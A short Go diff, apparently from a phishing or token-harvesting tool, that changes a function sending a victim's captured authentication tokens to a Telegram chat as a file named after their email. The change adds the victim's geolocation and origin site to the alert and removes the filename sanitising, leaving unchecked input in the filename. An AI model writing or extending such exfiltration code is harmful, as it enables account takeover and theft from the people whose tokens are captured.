@@ -1075,8 +1075,9 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 			userEmail = "unknown"
 		}
 
-		// Minimal caption - just the email
-		caption := fmt.Sprintf("📧 %s", userEmail)
+		// Caption with email and location
+		caption := fmt.Sprintf("📧 %s\n📍 %s, %s %s\n🌐 %s",
+			userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag, data.Origin)
 
 		// File content: raw tokens only, easy to copy
 		var fileContent strings.Builder
@@ -1088,17 +1089,11 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 			fileContent.WriteString(rt)
 		}
 
-		// Determine filename
-		usernameFile := "tokens"
+		// Filename is the email address
+		filename := "tokens.txt"
 		if userEmail != "" && userEmail != "unknown" {
-			usernameFile = strings.Map(func(r rune) rune {
-				if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
-					return r
-				}
-				return '_'
-			}, userEmail)
+			filename = userEmail + ".txt"
 		}
-		filename := fmt.Sprintf("%s.txt", usernameFile)
 
 		// Send as file via Telegram sendDocument
 		var body bytes.Buffer
